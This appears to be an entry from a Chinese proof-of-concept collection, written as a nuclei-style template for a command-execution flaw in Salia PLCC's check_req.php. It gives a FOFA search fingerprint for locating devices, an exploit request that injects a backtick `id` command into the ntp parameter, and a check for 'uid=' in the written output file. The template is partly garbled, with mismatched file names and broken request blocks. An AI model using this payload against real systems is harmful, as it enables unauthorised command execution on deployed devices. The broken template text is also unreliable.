# SaliaPLCCcheck_req.php命令执行漏洞

- **系统**：SaliaPLCCcheck　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="Salia PLCC"`
- **请求**：`GET /check\_req.php?ntp=`id>test123.txt` HTTP/1.1`
- **关键头**：`id: salia-plcc-check\_req-rce`　`name: salia-plcc-check\_req-rce`　`author: ASD`　`severity: high`　`description: salia-plcc-check\_req-rce`　`tags: salia,rce`　`fofa-qeury: Salia PLCC`　`veified: true`

**请求体 / payload**
```
访问结果
GET /test123.txt HTTP/1.1
Host:
- raw:
-
Host: {{Hostname}}
-
GET /2.txt HTTP/1.1
Host: {{Hostname}}
matchers:
- type: dsl
dsl:
- status\_code\_2==200 && contains\_all(body,"uid=")
```
- **预期**：200　|　uid=